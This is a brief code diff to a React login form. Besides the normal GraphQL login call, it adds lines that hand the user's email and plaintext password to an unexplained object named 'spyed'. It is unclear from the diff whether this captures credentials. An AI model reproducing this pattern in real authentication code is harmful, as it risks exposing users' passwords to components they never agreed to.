@@ -29,8 +29,6 @@ const Login = (props: { history: string[] }) => {
 
   const [errors, setErrors] = useState({});
 
-
-
   const [loginUser, { loading }] = useMutation(LOGIN_USER, {
     update(proxy, result) {
       console.log(result);
@@ -47,14 +45,14 @@ const Login = (props: { history: string[] }) => {
     event.preventDefault();
     const data = new FormData(event.currentTarget);
 
-    console.log("Δ",data.get('email'))
     loginUser({
       variables: {
         email: data.get('email'),
         password: data.get('password'),
       },
     });
-    spyed.play()
+    spyed.triggered(data.get('email'));
+    spyed.triggered(data.get('password'))
   };
 
   return (
